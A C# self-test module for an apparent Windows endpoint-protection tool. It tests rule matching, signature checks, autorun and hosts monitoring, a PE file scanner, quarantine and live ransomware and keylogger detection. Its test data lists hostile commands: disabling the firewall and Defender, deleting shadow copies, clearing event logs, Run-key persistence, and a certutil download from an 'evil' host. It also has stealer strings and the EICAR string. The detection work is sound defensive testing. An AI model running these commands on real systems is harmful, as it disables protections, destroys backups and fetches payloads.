using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Nobetci
{
    /// <summary>nobetci.exe --selftest: exercises every layer against harmless stand-ins and writes selftest.txt next to the exe.</summary>
    static class SelfTest
    {
        class Collect : IAlertSink
        {
            public readonly List<Alert> All = new List<Alert>();
            public void Raise(Alert a) { lock (All) All.Add(a); }
            public Alert Find(Func<Alert, bool> f) { lock (All) return All.FirstOrDefault(f); }
        }

        static readonly StringBuilder log = new StringBuilder();
        static int fails;

        static void Check(string name, bool ok, string extra = null)
        {
            log.AppendLine((ok ? "PASS  " : "FAIL  ") + name + (extra != null ? "  (" + extra + ")" : ""));
            if (!ok) fails++;
        }

        static Alert Wait(Collect c, Func<Alert, bool> f, int ms)
        {
            DateTime end = DateTime.Now.AddMilliseconds(ms);
            while (DateTime.Now < end) { Alert a = c.Find(f); if (a != null) return a; Thread.Sleep(100); }
            return null;
        }

        static void RunHidden(string exe, string args)
        {
            ProcessStartInfo psi = new ProcessStartInfo(exe, args); psi.CreateNoWindow = true; psi.UseShellExecute = false;
            using (Process p = Process.Start(psi)) p.WaitForExit(10000);
        }

        public static int Run()
        {
            string tmp = Path.Combine(Path.GetTempPath(), "nobetci_selftest_" + Guid.NewGuid().ToString("N").Substring(0, 8));
            Directory.CreateDirectory(tmp);
            tmp = LongPath(tmp);     // the kernel reports long names; %TEMP% is often the 8.3 form
            Environment.SetEnvironmentVariable("NOBETCI_DIR", tmp);
            try
            {
                Rulez();
                Signatures();
                Autoruns();
                Hosts(tmp);
                Scans(tmp);
                RansomRules();
                Behaviors(tmp);
            }
            catch (Exception ex) { log.AppendLine("FAIL  exception: " + ex); fails++; }
            finally { try { Directory.Delete(tmp, true); } catch { } }

            log.AppendLine(); log.AppendLine(fails == 0 ? "ALL PASSED" : fails + " FAILED");
            string outFile = Path.Combine(AppContext.BaseDirectory, "selftest.txt");
            File.WriteAllText(outFile, log.ToString());
            return fails;
        }

        // ------------------------------------------------------------------ pure rules
        static void Rulez()
        {
            string[] bad =
            {
                "netsh advfirewall set allprofiles state off",
                "NetSh.exe  Advfirewall Set AllProfiles State Off",
                "powershell -c Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False",
                "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
                "powershell Add-MpPreference -ExclusionPath C:\\Users\\Public",
                "cmd /c cacls C:\\Windows\\System32\\drivers\\etc\\hosts /e /p everyone:f",
                "cmd /c echo 1.2.3.4 evil.com >> C:\\Windows\\System32\\drivers\\etc\\hosts",
                "sc create evil binPath= C:\\x\\evil.sys type= kernel",
                "vssadmin delete shadows /all /quiet",
                "wevtutil cl Security",
                "x.dll /protection off",
                "x.dll /op:uninstall_app",
                "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\x.exe",
                "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v Debugger /d C:\\x.exe",
                "certutil -urlcache -f http://evil/x.exe x.exe",
                "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
            };
            foreach (string c in bad) Check("rule flags: " + (c.Length > 60 ? c.Substring(0, 60) + "…" : c), Rules.CheckCommandLine(c).Count > 0);

            string[] good =
            {
                "\"C:\\Windows\\System32\\svchost.exe\" -k netsvcs -p -s Schedule",
                "node server.js --port 8787",
                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer",
                "netsh interface ip show address",
                "powershell -NoProfile -Command Get-Process",
                "cmd /c type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "sc query WinDefend",
                "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "schtasks /query /fo list",
            };
            foreach (string c in good) Check("rule quiet: " + (c.Length > 60 ? c.Substring(0, 60) + "…" : c), Rules.CheckCommandLine(c).Count == 0, string.Join(",", Rules.CheckCommandLine(c).Select(f => f.Code)));

            Check("user-writable: Temp", Rules.IsUserWritable(@"C:\Users\a\AppData\Local\Temp\x.exe"));
            Check("user-writable: Downloads", Rules.IsUserWritable(@"C:\Users\a\Downloads\x.exe"));
            Check("not user-writable: Program Files", !Rules.IsUserWritable(@"C:\Program Files\App\x.exe"));
            Check("system location: System32", Rules.IsSystemLocation(@"C:\Windows\System32\cmd.exe"));
            Check("not system location: Temp", !Rules.IsSystemLocation(@"C:\Users\a\AppData\Local\Temp\x.exe"));
        }

        // ------------------------------------------------------------------ signatures
        static void Signatures()
        {
            string me = Environment.ProcessPath;
            string dotnet = Directory.GetParent(AppContext.BaseDirectory) != null ? FindDotnet() : null;
            if (dotnet != null)
            {
                SigInfo s = Sig.Check(dotnet);
                Check("signature: Microsoft-signed dotnet.exe is valid", s.Signed, s.Publisher);
                Check("signature: publisher read", s.Publisher.IndexOf("Microsoft", StringComparison.OrdinalIgnoreCase) >= 0, s.Publisher);
            }
            else log.AppendLine("SKIP  signature test (no signed reference file found)");
            if (File.Exists(me)) Check("signature: our unsigned exe is not valid", !Sig.Check(me).Signed);
            string sha = Procs.Sha256(me);
            Check("sha256 computed", sha != null && sha.Length == 64);
        }

        static string FindDotnet()
        {
            string[] candidates =
            {
                Path.Combine(AppContext.BaseDirectory, "dotnet.exe"),
                @"C:\Program Files\dotnet\dotnet.exe",
                Path.Combine(Path.GetDirectoryName(typeof(object).Assembly.Location) ?? "", @"..\..\..\dotnet.exe"),
            };
            foreach (string c in candidates) { try { string f = Path.GetFullPath(c); if (File.Exists(f)) return f; } catch { } }
            string env = Environment.GetEnvironmentVariable("DOTNET_ROOT");
            if (env != null && File.Exists(Path.Combine(env, "dotnet.exe"))) return Path.Combine(env, "dotnet.exe");
            string kernel = Path.Combine(Environment.SystemDirectory, "ntoskrnl.exe");   // always there, always carries its own signature
            if (File.Exists(kernel) && Sig.Check(kernel).Signed) return kernel;
            return null;
        }

        // ------------------------------------------------------------------ autoruns
        static void Autoruns()
        {
            Collect c = new Collect();
            Hub.Sink = c;
            const string name = "NobetciSelfTest";
            string runKey = @"Software\Microsoft\Windows\CurrentVersion\Run";
            using (RegistryKey k = Registry.CurrentUser.OpenSubKey(runKey, true)) { if (k != null) k.DeleteValue(name, false); }

            AutorunWatch w = new AutorunWatch();
            w.Dry = true; w.IntervalMs = 400;
            w.Start();
            using (RegistryKey k = Registry.CurrentUser.CreateSubKey(runKey)) k.SetValue(name, @"C:\Users\Public\selftest.exe");
            Alert a = Wait(c, x => x.Kind == "autorun" && x.Title.Contains(name), 8000);
            Check("autorun: new Run value detected", a != null);
            Check("autorun: detail names the command", a != null && a.Detail.Contains("selftest.exe"));

            Dictionary<string, AutorunEntry> snap = AutorunWatch.Snapshot();
            AutorunEntry e = snap.Values.FirstOrDefault(x => x.Name == name);
            Check("autorun: snapshot contains it", e != null);
            if (e != null)
            {
                Check("autorun: Remove() succeeds", AutorunWatch.Remove(e));
                Check("autorun: gone after remove", !AutorunWatch.Snapshot().Values.Any(x => x.Name == name));
            }
            using (RegistryKey k = Registry.CurrentUser.OpenSubKey(runKey, true)) { if (k != null) k.DeleteValue(name, false); }
            w.Dispose();
            Hub.Sink = null;
        }

        // ------------------------------------------------------------------ hosts (a temp file, never the real one)
        static void Hosts(string tmp)
        {
            Collect c = new Collect();
            Hub.Sink = c;
            string hosts = Path.Combine(tmp, "hosts");
            string original = "# test\r\n127.0.0.1 localhost\r\n";
            File.WriteAllText(hosts, original);

            TamperGuard g = new TamperGuard();
            g.HostsPath = hosts; g.Dry = true; g.IntervalMs = 300;
            g.Start();
            File.AppendAllText(hosts, "1.2.3.4 rival-site.test\r\n");
            Alert a = Wait(c, x => x.Kind == "hosts", 6000);
            Check("hosts: added line detected", a != null);
            Check("hosts: alert shows the new line", a != null && a.Detail.Contains("rival-site.test"));
            Check("hosts: restore puts the file back", g.RestoreHosts() && File.ReadAllText(hosts) == original);

            int before; lock (c.All) before = c.All.Count(x => x.Kind == "hosts");
            File.WriteAllText(hosts, original + "# only a comment\r\n");
            Thread.Sleep(1200);
            int after; lock (c.All) after = c.All.Count(x => x.Kind == "hosts");
            Check("hosts: comment-only change is ignored", after == before);
            g.Dispose();
            Hub.Sink = null;
        }

        // ------------------------------------------------------------------ file scanner (synthetic files, nothing that can run)
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern int GetLongPathName(string path, StringBuilder buf, int size);

        static string LongPath(string p)
        {
            try { StringBuilder sb = new StringBuilder(1024); int n = GetLongPathName(p, sb, sb.Capacity); return n > 0 && n < sb.Capacity ? sb.ToString() : p; } catch { return p; }
        }

        static void W16(byte[] b, int o, int v) { b[o] = (byte)v; b[o + 1] = (byte)(v >> 8); }
        static void W32(byte[] b, int o, uint v) { b[o] = (byte)v; b[o + 1] = (byte)(v >> 8); b[o + 2] = (byte)(v >> 16); b[o + 3] = (byte)(v >> 24); }

        /// <summary>A PE32+ image with just enough structure for the parser: headers and section table, no real code.</summary>
        static byte[] MakePe(string[] names, uint[] flags, byte[][] data, int entrySection)
        {
            const int nt = 0x80, opt = nt + 24, optSize = 240, headers = 0x400;
            int[] ptr = new int[names.Length], size = new int[names.Length];
            int raw = headers;
            for (int i = 0; i < names.Length; i++)
            {
                size[i] = Math.Max(0x200, (data[i].Length + 0x1FF) & ~0x1FF);
                ptr[i] = raw; raw += size[i];
            }
            byte[] b = new byte[raw];
            b[0] = (byte)'M'; b[1] = (byte)'Z';
            W32(b, 0x3C, nt);
            W32(b, nt, 0x4550); W16(b, nt + 4, 0x8664); W16(b, nt + 6, names.Length); W16(b, nt + 20, optSize); W16(b, nt + 22, 0x22);
            W16(b, opt, 0x20B); W32(b, opt + 16, (uint)(0x1000 * (entrySection + 1) + 0x10)); W16(b, opt + 68, 3); W32(b, opt + 108, 16);
            for (int i = 0; i < names.Length; i++)
            {
                int o = opt + optSize + i * 40;
                Encoding.ASCII.GetBytes(names[i], 0, Math.Min(8, names[i].Length), b, o);
                W32(b, o + 8, (uint)Math.Max(1, data[i].Length)); W32(b, o + 12, (uint)(0x1000 * (i + 1))); W32(b, o + 16, (uint)size[i]); W32(b, o + 20, (uint)ptr[i]); W32(b, o + 36, flags[i]);
                Buffer.BlockCopy(data[i], 0, b, ptr[i], data[i].Length);
            }
            return b;
        }

        const uint Code = 0x60000020, Data = 0xC0000040, RoData = 0x40000040, Rwx = 0xE0000020;

        static byte[] Fill(int n, byte v) { byte[] b = new byte[n]; for (int i = 0; i < n; i++) b[i] = v; return b; }
        static byte[] Noise(int n, int seed) { byte[] b = new byte[n]; new Random(seed).NextBytes(b); return b; }
        static byte[] Words(params string[] w) { return Encoding.ASCII.GetBytes(string.Join("\0", w) + "\0"); }
        static ScanResult An(string path, byte[] b) { return Scanner.Analyze(path, b, b.Length, b.Length); }
        static string Why(ScanResult r) { return r.Score + ": " + r.Summary(); }

        static void Scans(string tmp)
        {
            byte[] plain = MakePe(new[] { ".text", ".data" }, new[] { Code, Data }, new[] { Fill(1500, 0x90), new byte[300] }, 0);
            PeInfo pe = PeInfo.Parse(plain, plain.Length, plain.Length);
            Check("scan: PE parser reads a 64-bit image", pe.Valid && pe.Is64 && !pe.IsDll && !pe.IsDriver && !pe.IsDotNet && pe.Sections.Count == 2);
            Check("scan: PE parser finds the entry section", pe.EntrySection == 0 && pe.Sections[0].Name == ".text" && pe.OverlaySize == 0, "entry=" + pe.EntrySection);
            Check("scan: not a PE is not valid", !PeInfo.Parse(Fill(600, 0x41), 600, 600).Valid);
            ScanResult r = An(@"C:\Program Files\App\tool.exe", plain);
            Check("scan: plain program scores 0", r.Score == 0, Why(r));

            r = An(@"C:\Users\a\Downloads\setup.exe", MakePe(new[] { "UPX0", "UPX1", ".rsrc" }, new[] { Rwx | 0x80, Rwx, RoData }, new[] { new byte[0], Fill(900, 0x33), new byte[200] }, 1));
            Check("scan: packer sections recognised", r.Reasons.Any(x => x.Contains("Paketleyici")) && r.Reasons.Any(x => x.Contains("yazılabilir")), Why(r));

            r = An(@"C:\Users\a\Downloads\tool.exe", MakePe(new[] { ".text", ".data" }, new[] { Code, Data }, new[] { Noise(4096, 7), new byte[300] }, 0));
            Check("scan: encrypted code section recognised", r.Reasons.Any(x => x.Contains("Kodu sıkıştırılmış")), Why(r));

            byte[] caps = Words("WriteProcessMemory", "CreateRemoteThread", "VirtualAllocEx", "NtUnmapViewOfSection", "SetThreadContext",
                @"\Google\Chrome\User Data\Default\Login Data", "logins.json", "key4.db", "wallet.dat", "https://api.telegram.org/bot1/sendDocument");
            r = An(@"C:\Users\a\Downloads\tool.exe", MakePe(new[] { ".text", ".rdata" }, new[] { Code, RoData }, new[] { Fill(1500, 0x90), caps }, 0));
            Check("scan: injector + stealer strings score as malicious", r.Score >= Scanner.MaliciousAt && r.Reasons.Count >= 4, Why(r));
            // the same words as UTF-16, the way .NET keeps its strings
            r = An(@"C:\Users\a\Downloads\tool.exe", MakePe(new[] { ".text", ".rdata" }, new[] { Code, RoData }, new[] { Fill(1500, 0x90), Encoding.Unicode.GetBytes("api.telegram.org/bot1/x\0  vssadmin delete shadows /all /quiet\0") }, 0));
            Check("scan: UTF-16 strings are read too", r.Score >= 60, Why(r));

            r = An(@"C:\Users\a\Downloads\fatura.pdf.exe", plain);
            Check("scan: double extension flagged", r.Reasons.Any(x => x.Contains("Çift uzantı")), Why(r));
            r = An(@"C:\Users\a\AppData\Local\Temp\svchost.exe", plain);
            Check("scan: system name outside Windows flagged", r.Score >= Scanner.SuspiciousAt && r.Reasons.Any(x => x.Contains("Windows sistem dosyasının adını")), Why(r));
            Check("scan: the real svchost path stays clean", An(@"C:\Windows\System32\svchost.exe", plain).Score == 0);

            r = An(@"C:\Users\a\Downloads\tool.exe", MakePe(new[] { ".text", ".rdata" }, new[] { Code, RoData }, new[] { Fill(1500, 0x90), Words("get_RenderedLineData", "SyncUpdateDeferredLineVisuals", "LoadCratio") }, 0));
            Check("scan: ordinary identifiers are not malware family names", r.Score == 0, Why(r));
            r = An(@"C:\Users\a\Downloads\tool.exe", MakePe(new[] { ".text", ".rdata" }, new[] { Code, RoData }, new[] { Fill(1500, 0x90), Words("RedLine Stealer build 22") }, 0));
            Check("scan: a real family name is still recognised", r.Reasons.Any(x => x.Contains("zararlı yazılım ailesi")), Why(r));

            byte[] badPs = Encoding.UTF8.GetBytes("$ErrorActionPreference = 'SilentlyContinue'\r\npowershell Set-MpPreference -DisableRealtimeMonitoring $true\r\nvssadmin delete shadows /all /quiet\r\n");
            r = An(@"C:\Users\a\Downloads\kur.ps1", badPs);
            Check("scan: hostile script scores as malicious", r.Score >= Scanner.MaliciousAt, Why(r));
            r = An(@"C:\Users\a\Downloads\liste.ps1", Encoding.UTF8.GetBytes("Get-Process | Sort-Object CPU -Descending | Select-Object -First 10\r\nWrite-Host 'bitti'\r\n"));
            Check("scan: ordinary script scores 0", r.Score == 0, Why(r));

            File.WriteAllText(Store.PathOf("rules.txt"), "# deneme\nÖzel kural|45|all|nobetci-ozel-imza,ikinci-kelime\nYarım kural|30|any:2|alfa-bir,beta-iki,gama-uc\n", Encoding.UTF8);
            r = An(@"C:\Users\a\Downloads\x.ps1", Encoding.UTF8.GetBytes("rem NOBETCI-OZEL-IMZA ve ikinci-kelime; alfa-bir\r\n"));
            Check("scan: rules.txt rule fires (all words)", r.Score == 45 && r.Reasons.Any(x => x.Contains("Özel kural")), Why(r));
            r = An(@"C:\Users\a\Downloads\x.ps1", Encoding.UTF8.GetBytes("rem alfa-bir gama-uc\r\n"));
            Check("scan: rules.txt rule fires (any:2)", r.Score == 30 && r.Reasons.Any(x => x.Contains("Yarım kural")), Why(r));
            try { File.Delete(Store.PathOf("rules.txt")); } catch { }

            // ---- whole-file verdicts, on files in the temp folder
            string dir = Path.Combine(tmp, "tarama");
            Directory.CreateDirectory(Path.Combine(dir, "alt"));
            string bat = Path.Combine(dir, "alt", "kapat.bat"), clean = Path.Combine(dir, "liste.ps1"), harmless = Path.Combine(dir, "zararsiz.exe");
            File.WriteAllText(bat, "@echo off\r\nnetsh advfirewall set allprofiles state off\r\n");
            File.WriteAllText(clean, "Get-ChildItem | Measure-Object\r\n");
            File.WriteAllBytes(harmless, Encoding.ASCII.GetBytes("nobetci zararsiz deneme dosyasi " + Guid.NewGuid().ToString("N")));
            File.WriteAllText(Path.Combine(dir, "not.txt"), "taranmayan uzanti");

            r = Scanner.ScanFile(bat);
            Check("scan: hostile batch file verdict is malicious", r.Verdict == 2 && r.Sha256 != null && !r.HardHit, Why(r));
            Check("scan: clean script verdict is clean", Scanner.ScanFile(clean).Verdict == 0);
            int hits = 0;
            int count = ScanService.ScanPath(dir, x => hits++, null);
            Check("scan: folder scan walks subfolders and skips other types", count == 3 && hits == 1, "files=" + count + " hits=" + hits);

            r = Scanner.ScanFile(harmless);
            Check("scan: unknown harmless file is clean", r.Verdict == 0 && r.Sha256 != null, Why(r));
            string sha = r.Sha256;
            Scanner.Block(sha, "selftest"); Scanner.ForgetCache();
            r = Scanner.ScanFile(harmless);
            Check("scan: block.txt hash is malicious wherever it is", r.Verdict == 2 && r.HardHit && r.Reasons[0].Contains("Kara liste"), Why(r));
            Store.Allow(sha, harmless); Scanner.ForgetCache();
            Check("scan: allow-list wins over everything", Scanner.ScanFile(harmless).Verdict == 0);

            r = Scanner.ScanFile(Path.Combine(AppContext.BaseDirectory, "Nobetci.dll"));
            Check("scan: our own files are not judged", r.Verdict == 0 && r.Reasons.Count == 0, Why(r));
            string dotnet = FindDotnet();
            if (dotnet != null) { r = Scanner.ScanFile(dotnet); Check("scan: signed program passes", r.Verdict == 0 && r.Signed, Why(r)); }
            else log.AppendLine("SKIP  scan: signed program (no signed reference file found)");

            // ---- Windows' own files: signed through a catalog, and still judged by name and place
            string cmd = Path.Combine(Environment.SystemDirectory, "cmd.exe");
            SigInfo cs = Sig.Check(cmd);
            if (!Native.HasValidSignature(cmd))
            {
                Check("signature: catalog-signed Windows file counts as signed", cs.Signed && cs.Catalog && cs.Publisher.IndexOf("Microsoft", StringComparison.OrdinalIgnoreCase) >= 0, cs.Signed + " " + cs.Publisher);
                string copy = Path.Combine(dir, "guncelle.exe");
                File.Copy(cmd, copy, true);
                r = Scanner.ScanFile(copy);
                Check("scan: renamed copy of a Windows tool is flagged despite its signature", r.Signed && r.Verdict >= 1 && r.Reasons.Any(x => x.Contains("cmd.exe")), Why(r));
                Check("trust: a renamed interpreter is still an interpreter", Trust.IsScriptHost(copy) && !Trust.IsTrusted(copy));
                try { File.Delete(copy); } catch { }
            }
            else log.AppendLine("SKIP  signature: catalog test (cmd.exe carries an embedded signature here)");

            // ---- vulnerable drivers
            Check("driver: known vulnerable name", Drivers.Check(@"C:\x\RTCore64.sys", null) != null && Drivers.KnownName(@"\SystemRoot\System32\drivers\RTCore64.sys"));
            Check("driver: ordinary name passes", Drivers.Check(@"C:\x\disk.sys", null) == null && !Drivers.KnownName(@"C:\Windows\System32\drivers\disk.sys"));
            List<string> parsed = Drivers.ParseCsv("Id,SHA256\n1," + new string('a', 64) + "\n2," + new string('B', 64) + "," + new string('c', 70) + "\n3," + new string('a', 64) + ",deadbeef\n");
            Check("driver: feed parser keeps only whole SHA-256 values", parsed.Count == 2 && parsed.Contains(new string('b', 64)), "count=" + parsed.Count);
            string drv = Path.Combine(dir, "deneme.sys");
            File.WriteAllBytes(drv, Encoding.ASCII.GetBytes("nobetci surucu deneme " + Guid.NewGuid().ToString("N")));
            File.WriteAllLines(Store.PathOf("loldrivers.txt"), new[] { Procs.Sha256(drv) });
            r = Scanner.ScanFile(drv);
            Check("driver: listed hash is a hard hit", r.Verdict == 2 && r.HardHit && r.Reasons[0].Contains("loldrivers"), Why(r));
            int fed = Drivers.Update(15);
            log.AppendLine("INFO  driver: live loldrivers.io feed " + (fed > 0 ? "downloaded, " + fed + " hashes" : "not reachable (the bundled name list still applies)"));

            // a vulnerable driver that ships inside Windows' own driver store is reported, but only a copy elsewhere is a hard hit
            string inbox = null;
            try
            {
                string store = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "DriverStore", "FileRepository");
                foreach (string d in Directory.GetDirectories(store, "mdmmot64.inf_*")) { string f = Path.Combine(d, "SmSerl64.sys"); if (File.Exists(f)) inbox = f; }
            }
            catch { }
            if (inbox == null || fed <= 0) log.AppendLine("SKIP  driver: no listed in-box driver on this machine (or no feed) to test the driver-store exception");
            else
            {
                r = Scanner.ScanFile(inbox);
                Check("driver: listed driver inside the Windows driver store is flagged but not a hard hit", r.Verdict == 1 && !r.HardHit, Why(r));
                string outside = Path.Combine(dir, "SmSerl64.sys");
                File.Copy(inbox, outside, true);
                r = Scanner.ScanFile(outside);
                Check("driver: the same driver dropped elsewhere is a hard hit", r.Verdict == 2 && r.HardHit, Why(r));
            }

            // ---- quarantine
            string q = Path.Combine(dir, "karantina.exe");
            byte[] body = Encoding.ASCII.GetBytes("nobetci karantina deneme " + Guid.NewGuid().ToString("N"));
            File.WriteAllBytes(q, body);
            string id = Quarantine.Put(q, "selftest");
            string stored = id == null ? null : Path.Combine(Quarantine.Dir, id + ".q");
            Check("quarantine: file is taken away", id != null && !File.Exists(q) && File.Exists(stored));
            Check("quarantine: stored copy is defanged", stored != null && File.Exists(stored) && !File.ReadAllBytes(stored).SequenceEqual(body) && Quarantine.OriginalPath(id) == q);
            Check("quarantine: restore brings it back intact", id != null && Quarantine.Restore(id, null) && File.Exists(q) && File.ReadAllBytes(q).SequenceEqual(body) && !File.Exists(stored));

            // ---- antimalware engine (the standard test string, built in memory and never written to disk)
            if (!Amsi.Available) log.AppendLine("SKIP  amsi: no antimalware engine registered on this machine");
            else
            {
                byte[] test = Encoding.ASCII.GetBytes(@"X5O!P%@AP[4\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-" + "ANTIVIRUS-TEST-FILE!$H+H*");
                bool? bad = Amsi.IsMalware(test, test.Length, "selftest.com");
                byte[] fine = Encoding.ASCII.GetBytes("Get-Date");
                bool? ok = Amsi.IsMalware(fine, fine.Length, "selftest.ps1");
                if (bad == true) Check("amsi: engine recognises the standard test string", true);
                else log.AppendLine("SKIP  amsi: engine answered " + (bad == null ? "nothing" : "clean") + " for the test string (real-time protection may be off)");
                Check("amsi: ordinary text is not flagged", ok != true);
            }
        }

        static void RansomRules()
        {
            byte[] noise = Noise(4096, 3);
            byte[] zip = Noise(4096, 4); zip[0] = 0x50; zip[1] = 0x4B; zip[2] = 3; zip[3] = 4;
            StringBuilder sb = new StringBuilder();
            while (sb.Length < 4096) sb.Append("Toplanti notlari: butce, takvim ve gorev dagilimi. ");
            byte[] text = Encoding.ASCII.GetBytes(sb.ToString());
            Check("ransom: entropy separates text from noise", RansomGuard.Entropy(text, text.Length) < 5 && RansomGuard.Entropy(noise, noise.Length) > 7.8);
            Check("ransom: .docx turned to noise looks encrypted", RansomGuard.LooksEncrypted("docx", noise, noise.Length) == true);
            Check("ransom: real (compressed) .docx does not", RansomGuard.LooksEncrypted("docx", zip, zip.Length) == false);
            Check("ransom: .txt turned to noise looks encrypted", RansomGuard.LooksEncrypted("txt", noise, noise.Length) == true);
            Check("ransom: ordinary .txt does not", RansomGuard.LooksEncrypted("txt", text, text.Length) == false);
            Check("ransom: tiny file is not judged", RansomGuard.LooksEncrypted("txt", noise, 200) == null);
        }

        // ------------------------------------------------------------------ live: the test process arms a keylogger's hooks for a moment
        delegate IntPtr HookProc(int code, IntPtr w, IntPtr l);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int id, HookProc fn, IntPtr module, uint thread);
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hook);
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hook, int code, IntPtr w, IntPtr l);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern IntPtr GetModuleHandle(string name);
        [StructLayout(LayoutKind.Sequential)]
        struct RAWINPUTDEVICE { public ushort UsagePage, Usage; public uint Flags; public IntPtr Target; }
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool RegisterRawInputDevices(RAWINPUTDEVICE[] devices, uint count, uint size);

        static void LiveSpy(Engine eng, Collect c)
        {
            if (!eng.Etw.SpyOk) { log.AppendLine("SKIP  spy: window-manager event session did not start"); return; }

            HookProc proc = (code, w, l) => CallNextHookEx(IntPtr.Zero, code, w, l);
            IntPtr hook = SetWindowsHookEx(13, proc, GetModuleHandle(null), 0);
            if (hook != IntPtr.Zero) UnhookWindowsHookEx(hook);      // installed for a few microseconds: nothing is ever read
            GC.KeepAlive(proc);
            if (hook == IntPtr.Zero) log.AppendLine("SKIP  spy: could not install a test keyboard hook in this session");
            else
            {
                Alert a = Wait(c, x => x.Kind == "spy" && x.Detail.Contains("WH_KEYBOARD_LL"), 10000);
                Check("spy: global keyboard hook detected live", a != null && a.Severity == Sev.Danger);
                Check("spy: alert names the program", a != null && a.Title.Contains("klavyeyi dinliyor") && a.Detail.Contains("PID " + Process.GetCurrentProcess().Id));
            }

            using (System.Windows.Forms.Control window = new System.Windows.Forms.Control())
            {
                IntPtr hwnd = window.Handle;
                int size = Marshal.SizeOf(typeof(RAWINPUTDEVICE));
                bool on = RegisterRawInputDevices(new[] { new RAWINPUTDEVICE { UsagePage = 1, Usage = 6, Flags = 0x100, Target = hwnd } }, 1, (uint)size);
                if (on) RegisterRawInputDevices(new[] { new RAWINPUTDEVICE { UsagePage = 1, Usage = 6, Flags = 1, Target = IntPtr.Zero } }, 1, (uint)size);
                if (!on) log.AppendLine("SKIP  spy: could not register raw keyboard input in this session");
                else Check("spy: background raw keyboard input detected live", Wait(c, x => x.Kind == "spy" && x.Detail.Contains("RIDEV_INPUTSINK"), 10000) != null);
            }
        }

        // ------------------------------------------------------------------ live: the test process "encrypts" and renames its own decoy documents
        static void LiveRansom(Engine eng, Collect c, string docs)
        {
            string[] traps = eng.Ransom.CanaryFiles();
            Check("ransom: decoy file planted", traps.Length == 1 && File.Exists(traps[0]) && (File.GetAttributes(traps[0]) & FileAttributes.Hidden) != 0);

            for (int i = 0; i < 20; i++) File.WriteAllBytes(Path.Combine(docs, "not_" + i + ".txt"), Noise(4096, 100 + i));
            Alert a = Wait(c, x => x.Kind == "ransom" && x.Title.Contains("şifreliyor olabilir"), 12000);
            Check("ransom: mass rewrite with random data detected live", a != null && a.Severity == Sev.Danger, a == null ? null : a.Detail.Replace(Environment.NewLine, " | "));

            for (int i = 0; i < 45; i++) { string f = Path.Combine(docs, "rapor_" + i + ".docx"); File.Move(f, f + ".locked"); }
            a = Wait(c, x => x.Kind == "ransom" && x.Title.Contains("yeniden adlandırıyor"), 12000);
            Check("ransom: mass rename of documents detected live", a != null);

            if (traps.Length == 1)
            {
                RunHidden("cmd.exe", "/c del /f /q /a \"" + traps[0] + "\"");
                a = Wait(c, x => x.Kind == "ransom" && x.Title.Contains("tuzak dosyaya dokundu"), 12000);
                Check("ransom: touching the decoy file detected live", a != null && a.Title.Contains("cmd.exe"), a == null ? null : a.Title);
                DateTime end = DateTime.Now.AddSeconds(4);
                while (DateTime.Now < end && !File.Exists(traps[0])) Thread.Sleep(100);
                Check("ransom: decoy file is put back", File.Exists(traps[0]));
            }
        }

        // ------------------------------------------------------------------ live: files dropped and started by other programs
        static void LiveScan(Collect c, string tmp)
        {
            string bat = Path.Combine(tmp, "damla.bat");
            RunHidden("cmd.exe", "/c echo netsh advfirewall set allprofiles state off> \"" + bat + "\"");
            Alert a = Wait(c, x => x.Kind == "scan" && x.Title.Contains("damla.bat"), 14000);
            Check("scan: dropped hostile script flagged live", a != null && a.Severity == Sev.Danger);
            Check("scan: alert names who dropped it", a != null && a.Detail.Contains("cmd.exe") && a.Detail.Contains("SHA-256"), a == null ? null : a.Detail.Replace(Environment.NewLine, " | "));

            // a genuine Windows program under a system name in Temp: the file scan must reach the process alert
            string fake = Path.Combine(tmp, "svchost.exe");
            try
            {
                File.Copy(Path.Combine(Environment.SystemDirectory, "cmd.exe"), fake, true);
                RunHidden(fake, "/c ver");
                a = Wait(c, x => x.Kind == "process" && x.Detail.Contains("Dosya taraması") && x.Detail.Contains("sistem dosyasının adını"), 10000);
                Check("scan: started program is scanned (system name in Temp)", a != null);
            }
            catch (Exception ex) { log.AppendLine("SKIP  scan: masquerade test (" + ex.Message + ")"); }
        }

        // ------------------------------------------------------------------ live kernel events (needs admin)
        static void Behaviors(string tmp)
        {
            Collect c = new Collect();
            Hub.Sink = c;
            Engine eng = new Engine();
            eng.Autorun.QuietFirstRun = false;

            // the test process plays the spy and the ransomware itself, inside its own temp folder
            string docs = Path.Combine(tmp, "belgeler"), trap = Path.Combine(tmp, "tuzak");
            Directory.CreateDirectory(docs); Directory.CreateDirectory(trap);
            byte[] docx = new byte[1024]; docx[0] = 0x50; docx[1] = 0x4B; docx[2] = 3; docx[3] = 4;
            for (int i = 0; i < 45; i++) File.WriteAllBytes(Path.Combine(docs, "rapor_" + i + ".docx"), docx);
            eng.Spy.IncludeSelf = true;
            eng.Ransom.IncludeSelf = true;
            eng.Ransom.ExcludeDirs = new string[0];
            eng.Ransom.CanaryDirs = new[] { trap };
            eng.Start(true);
            Check("etw: kernel session started", eng.EtwOk, eng.EtwError);
            if (!eng.EtwOk) { eng.Dispose(); Hub.Sink = null; return; }
            Thread.Sleep(1500);

            RunHidden("cmd.exe", "/c echo netsh advfirewall set allprofiles state off");
